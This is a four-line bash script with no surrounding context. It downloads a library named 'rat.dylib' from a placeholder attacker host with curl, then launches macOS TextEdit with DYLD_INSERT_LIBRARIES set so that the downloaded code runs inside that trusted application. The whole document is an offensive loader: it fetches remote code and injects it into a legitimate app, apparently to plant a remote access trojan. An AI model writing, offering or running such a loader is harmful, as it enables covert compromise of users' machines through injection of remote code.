#!/bin/bash
PAYLOAD_URL="http://attacker.localhost/macos.dylib"
curl -o /tmp/rat.dylib "$PAYLOAD_URL"
DYLD_INSERT_LIBRARIES=/tmp/rat.dylib /Applications/TextEdit.app/Contents/MacOS/TextEdit &
